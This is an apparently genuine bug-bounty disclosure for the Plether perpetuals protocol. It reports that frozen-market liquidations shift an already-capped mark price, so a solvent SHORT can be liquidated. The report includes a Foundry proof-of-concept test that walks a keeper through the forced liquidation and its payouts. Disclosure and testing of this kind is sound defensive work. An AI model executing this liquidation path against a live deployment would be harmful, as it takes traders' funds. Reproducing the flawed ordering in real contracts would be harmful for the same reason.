# \#99422 [SC-Medium] MED-10 fix misses frozen liquidations: a capped SHORT can be liquidated while solvent

**Submitted on Nov 13th 2026 at 16:03:12 UTC by @nemveer for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99422
- **Report Type:** Smart Contract
- **Report severity:** Medium
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro
MED-10 was fixed for live liquidations by shifting the raw basket price before applying the 2.00 cap. Frozen liquidations still start from the Engine's stored mark, which has already been capped, and then apply the SHORT-adverse shift. A SHORT that is solvent at the last live price can therefore become liquidatable when the oracle freezes, without a new price. Any keeper can trigger the liquidation and receive part of the trader's liquidation reserve.


## Vulnerability Details
The PoC opens a 1,000,000-token SHORT at 1.99. On Friday just before the weekly freeze, the six-feed mock Pyth basket reaches a raw 2.10 with 10 bps confidence. `CfdEngine.updateMarkPrice()` stores only the capped **2.00** mark (`packages/perps/src/CfdEngine.sol:1466-1476`). The SHORT has **60,400 USDG** equity at that price, above its 3% frozen-market margin requirement. A live public `executeLiquidation` call reverts `CfdEngine__PositionIsSolvent`: the oracle shifts raw 2.10 first, then caps the liquidation price at 2.00.

Eleven seconds later, the oracle is frozen. `PletherOracle._frozenBasket()` reads the stored **2.00**, attaches synthetic 10 bps confidence, and returns it as the basket price (`packages/perps/src/PletherOracle.sol:729-743`). Both liquidation APIs shift that already-capped value downward for a SHORT before the final cap (`PletherOracle.sol:308-343,532-543,966-972`). The resulting price is **1.9995**. Equity falls to **59,900 USDG**, below the approximately **59,985 USDG** requirement, so the same public keeper can liquidate the account with an empty price payload. No new market price or position change caused the eligibility change.

This is the capped-price ordering problem identified in Cecuro MED-10, left in the frozen branch after the live fix. Plether's whitepaper does describe frozen liquidation as using the stored mark plus a conservative shift. Its oracle test covers that policy at a 1.00 mark, but does not test what happens when storing the mark has discarded a raw price above the cap. Preserving the uncapped last mark, or enough information to reconstruct the raw-before-cap result, would avoid this discrepancy. Unconditionally skipping the SHORT shift at a capped mark would be incorrect when the lost raw price was only slightly above 2.00.

## Impact Details
At the 2.00 cap, the test SHORT has **10,000 USDG** of price profit and is solvent. Forced liquidation at 1.9995 reduces that profit by **500 USDG** and charges **1,990 USDG**. Its realized result is **2,490 USDG lower** than its value at the capped price. The keeper receives **995 USDG** from the trader-funded liquidation reserve; the pool retains the other **1,495 USDG** relative to paying the capped profit. The PoC reproduces the false liquidation through both single and batch execution and again 20 hours into the frozen window.

The prerequisite is substantial: the raw six-currency basket must rise far enough above the 2.00 cap that the live raw-price shift still caps at 2.00. The PoC proves the code path with the release six-feed configuration and mock prices.



## Proof of Concept

## Proof of Concept

Attach the **single file** `packages/perps/test/poc/FrozenLiquidationShiftsCappedMark.t.sol` directly to the Immunefi report. Place it at that path in a checkout of the commit above and run from the repository root:

```sh
forge test --root packages/perps --offline --match-path 'test/poc/FrozenLiquidationShiftsCappedMark.t.sol' -vv
```

**Observed: 4 passed, 0 failed.** The file uses the production Router, Engine, Oracle and liquidation paths with the release six feed IDs, weights, bases, inversions and risk settings. Only Pyth and USDG are mocked; nothing under `packages/perps/src` is changed. The tests cover the live solvency rejection, frozen single and batch liquidation, trader and keeper balances, persistence into the freeze, and a below-cap control.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {PletherOracle} from "@plether/perps/PletherOracle.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

/// @dev Public Router paths, release risk/oracle settings, mock Pyth and USDG only.
contract FrozenLiquidationShiftsCappedMarkTest is BasePerpTest {
    address internal constant TRADER = address(0xA11CE);
    address internal constant KEEPER = address(0xBEEF);
    uint256 internal constant SIZE = 1_000_000e18;
    uint256 internal constant ENTRY = 199_000_000;
    uint256 internal constant RAW_FRIDAY = 210_000_000;
    uint256 internal constant CAPPED = 200_000_000;
    uint256 internal constant FRI = 1_712_350_790; // 2024-04-05 20:59:50 UTC, NY 16:59:50
    bytes32 internal constant EUR = 0xa995d00bb36a63cef7fd2c287dc105fc8f3d93779f062f09551b0af3e81ec30b;
    bytes32 internal constant JPY = 0xef2c98c804ba503c6a707e38be4dfbb16683775f195b091252bf24693042fd52;
    bytes32 internal constant GBP = 0x84c2dde9633d93d1bcad84e7dc41c9d56578b7ec52fabedc1f335d673df0a7c1;
    bytes32 internal constant CAD = 0x3112b03a41c910ed446852aacf67118cb1bec67b2cd0b9a214c58cc0eaa2ecca;
    bytes32 internal constant SEK = 0x8ccb376aa871517e807358d4e3cf0bc7fe4950474dbe6c9ffc21ef64e43fc676;
    bytes32 internal constant CHF = 0x0b1e3297e69f162877b577b0d6a47a0d63b2392bc8499e6540da4187a63e28f8;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 10_000_000e6;
    }

    function setUp() public override {
        super.setUp();
        IOrderRouterAdminHost.RouterConfig memory cfg = _routerConfig();
        cfg.adverseConfidenceMultiplierBps = 2500;
        cfg.minOpenNotionalAssets = 1000e6;
        PletherOracle sixFeed = new PletherOracle(
            address(engine), address(pool), address(baseMockPyth), _feedIds(), _weights(), _bases(), _inversions()
        );
        routerAdmin.proposeRouterConfig(cfg);
        routerAdmin.proposeOracleConfig(IOrderRouterAdminHost.OracleConfig(address(sixFeed)));
        uint256 activation = routerAdmin.oracleConfigActivationTime();
        if (routerAdmin.routerConfigActivationTime() > activation) activation = routerAdmin.routerConfigActivationTime();
        vm.warp(activation);
        routerAdmin.finalizeRouterConfig();
        routerAdmin.finalizeOracleConfig();
        pletherOracle = sixFeed;
        assertEq(pletherOracle.basketMaxConfidenceRatioBps(), 10);
    }

    function _feedIds() internal pure returns (bytes32[] memory ids) {
        ids = new bytes32[](6);
        ids[0] = EUR; ids[1] = JPY; ids[2] = GBP; ids[3] = CAD; ids[4] = SEK; ids[5] = CHF;
    }

    function _weights() internal pure returns (uint256[] memory values) {
        values = new uint256[](6);
        values[0] = 0.576e18; values[1] = 0.136e18; values[2] = 0.119e18;
        values[3] = 0.091e18; values[4] = 0.042e18; values[5] = 0.036e18;
    }

    function _bases() internal pure returns (uint256[] memory values) {
        values = new uint256[](6);
        values[0] = 117_500_000; values[1] = 638_000; values[2] = 134_480_000;
        values[3] = 72_880_000; values[4] = 10_860_000; values[5] = 126_100_000;
    }

    function _inversions() internal pure returns (bool[] memory values) {
        values = new bool[](6);
        values[1] = true; values[3] = true; values[4] = true; values[5] = true;
    }

    function _tick(uint256 price, uint256 confidenceBps) internal view returns (bytes[] memory data) {
        bytes32[] memory ids = _feedIds();
        uint256[] memory bases = _bases();
        bool[] memory inversions = _inversions();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        for (uint256 i; i < ids.length; ++i) {
            uint256 rawPrice = inversions[i]
                ? (1e16 / bases[i]) * 1e8 / price
                : bases[i] * price / 1e8;
            // Inversion maps the lower raw endpoint to the upper basket endpoint.
            // This keeps both direct and inverted component contributions at about confidenceBps.
            uint64 conf = uint64(inversions[i]
                ? rawPrice * confidenceBps / (10_000 + confidenceBps)
                : rawPrice * confidenceBps / 10_000);
            ticks[i] = MockPyth.FeedUpdate(
                ids[i], MockPyth.MockPrice(int64(uint64(rawPrice)), conf, -8, vm.getBlockTimestamp(), vm.getBlockTimestamp() - 1)
            );
        }
        data = new bytes[](1);
        data[0] = abi.encode(ticks);
    }

    function _openShortAt(uint256 entryPrice, uint256 marginDelta) internal {
        vm.warp(FRI - 3 hours);
        vm.roll(vm.getBlockNumber() + 1);
        router.updateMarkPrice(_tick(entryPrice, 0));
        _fundTrader(TRADER, 100_000e6);
        uint32 window = uint32(router.maxExecutionWindowSeconds());
        OrderV3Types.OrderRequest memory request = OrderV3Types.OrderRequest({
            clientOrderId: bytes32(uint256(router.nextCommitId())),
            side: CfdTypes.Side.SHORT,
            sizeDelta: SIZE,
            marginDelta: marginDelta,
            targetPrice: type(uint256).max,
            isClose: false,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(vm.getBlockTimestamp()) + uint64(window),
                executionWindowSeconds: window,
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
        vm.prank(TRADER);
        uint64 id = router.commitOrder(request);
        vm.warp(vm.getBlockTimestamp() + 1);
        vm.roll(vm.getBlockNumber() + 1);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory r = router.executeOrder(id, _tick(entryPrice, 0));
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed), "SHORT opened");
    }

    function _toLastLiveCappedMark() internal {
        _openShortAt(ENTRY, 45_000e6);
        vm.warp(FRI);
        vm.roll(vm.getBlockNumber() + 1);
        assertFalse(engine.isOracleFrozen(), "Friday 16:59:50 NY is live");
        assertTrue(engine.isFadWindow(), "FAD margin is active");
        router.updateMarkPrice(_tick(RAW_FRIDAY, 10));
        assertEq(engine.lastMarkPrice(), CAPPED, "Engine stores capped mark");

        ICfdEngineTypes.LiquidationPreview memory cap = engineLens.previewLiquidation(TRADER, CAPPED);
        // Place equity 400 USDG above the 3% FAD threshold; the frozen 500 USDG
        // SHORT-adverse price shift should cross that threshold without a market move.
        int256 targetEquity = int256(60_400e6);
        assertLt(cap.equityAssets, targetEquity, "start below target equity");
        vm.prank(TRADER);
        engine.addMargin(TRADER, uint256(targetEquity - cap.equityAssets));
        cap = engineLens.previewLiquidation(TRADER, CAPPED);
        ICfdEngineTypes.LiquidationPreview memory shifted = engineLens.previewLiquidation(TRADER, 199_950_000);
        emit log_named_decimal_int("equity at cap", cap.equityAssets, 6);
        emit log_named_decimal_int("equity at shifted price", shifted.equityAssets, 6);
        assertFalse(cap.liquidatable, "solvent at 2.00 cap");
        assertTrue(shifted.liquidatable, "liquidatable at 1.9995");
    }

    function _traderValue() internal view returns (uint256) {
        return clearinghouse.balanceAssets(TRADER) + engine.traderClaimBalanceAssets(TRADER)
            + settlementToken.balanceOf(TRADER);
    }

    function test_LiveSolventThenFrozenLiquidated() public {
        _toLastLiveCappedMark();
        vm.prank(KEEPER);
        vm.expectRevert(ICfdEngineTypes.CfdEngine__PositionIsSolvent.selector);
        router.executeLiquidation(TRADER, new bytes[](0));

        uint256 traderBefore = _traderValue();
        uint256 keeperBefore = clearinghouse.balanceAssets(KEEPER);
        uint256 poolBefore = pool.totalAssets();
        vm.warp(FRI + 11);
        vm.roll(vm.getBlockNumber() + 1);
        assertTrue(engine.isOracleFrozen());
        assertEq(engine.lastMarkPrice(), CAPPED);
        vm.prank(KEEPER);
        router.executeLiquidation(TRADER, new bytes[](0));
        (uint256 remaining,,,,,,) = engine.positions(TRADER);
        assertEq(remaining, 0, "frozen liquidation removed solvent-at-cap SHORT");
        assertGt(clearinghouse.balanceAssets(KEEPER), keeperBefore, "keeper earns from forced liquidation");
        uint256 traderAfter = _traderValue();
        uint256 keeperGain = clearinghouse.balanceAssets(KEEPER) - keeperBefore;
        uint256 lpGainComparedWithCappedPayout = pool.totalAssets() + 10_000e6 - poolBefore;
        emit log_named_decimal_uint("trader loss versus holding capped profit", traderBefore + 10_000e6 - traderAfter, 6);
        emit log_named_decimal_uint("keeper gain", keeperGain, 6);
        emit log_named_decimal_uint("LP benefit versus capped payout", lpGainComparedWithCappedPayout, 6);
        assertEq(traderBefore + 10_000e6 - traderAfter, 2_490e6);
        assertEq(keeperGain, 995e6);
        assertEq(lpGainComparedWithCappedPayout, 1495e6);
    }

    function test_BatchLiquidatesSameSolventAtCapAccount() public {
        _toLastLiveCappedMark();
        vm.warp(FRI + 11);
        vm.roll(vm.getBlockNumber() + 1);
        address[] memory accounts = new address[](1);
        accounts[0] = TRADER;
        vm.prank(KEEPER);
        uint256 nextIndex = router.executeLiquidationBatch(accounts, new bytes[](0));
        assertEq(nextIndex, 1);
        (uint256 remaining,,,,,,) = engine.positions(TRADER);
        assertEq(remaining, 0, "batch path liquidates too");
    }

    function test_TwentyHoursLaterStillSolventAtCapButLiquidatableFrozen() public {
        _toLastLiveCappedMark();
        vm.warp(FRI + 20 hours);
        vm.roll(vm.getBlockNumber() + 1);
        assertTrue(engine.isOracleFrozen());
        assertFalse(engineLens.previewLiquidation(TRADER, CAPPED).liquidatable, "still solvent at cap");
        assertTrue(engineLens.previewLiquidation(TRADER, 199_950_000).liquidatable, "shift still crosses FAD margin");
        vm.prank(KEEPER);
        router.executeLiquidation(TRADER, new bytes[](0));
        (uint256 remaining,,,,,,) = engine.positions(TRADER);
        assertEq(remaining, 0);
    }

    function test_BelowCapFrozenPriceMatchesLiveMaximumConfidence() public {
        _openShortAt(149_000_000, 40_000e6);
        vm.warp(FRI);
        vm.roll(vm.getBlockNumber() + 1);
        router.updateMarkPrice(_tick(150_000_000, 10));
        assertEq(engine.lastMarkPrice(), 150_000_000);
        vm.prank(address(router));
        uint256 livePrice = pletherOracle.updateLiquidationPrice(address(this), new bytes[](0), TRADER).price;
        assertApproxEqAbs(livePrice, 149_962_500, 10, "live downward shift of about 2.5 bps");
        vm.warp(FRI + 11);
        vm.roll(vm.getBlockNumber() + 1);
        vm.prank(address(router));
        uint256 frozenPrice = pletherOracle.updateLiquidationPrice(address(this), new bytes[](0), TRADER).price;
        assertEq(frozenPrice, 149_962_500, "frozen synthetic maximum confidence shift");
        assertApproxEqAbs(frozenPrice, livePrice, 10, "below-cap rules agree within feed rounding");
    }
}

```
